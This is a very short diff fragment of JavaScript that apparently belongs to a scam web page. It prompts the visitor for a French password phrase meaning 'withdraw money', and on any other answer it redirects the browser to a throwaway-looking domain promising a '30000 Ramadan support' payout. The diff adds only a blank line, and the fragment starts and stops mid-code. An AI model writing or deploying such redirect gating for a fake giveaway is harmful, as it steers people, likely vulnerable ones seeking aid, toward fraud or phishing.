@@ -7,3 +7,4 @@ password = prompt(
 if (password != 'RETIRER DE L’ARGENT') {
   location.href = 'https://getin-ofer.cfd/30000-Soutien-Au-Ramadan.html';
   }
+ 
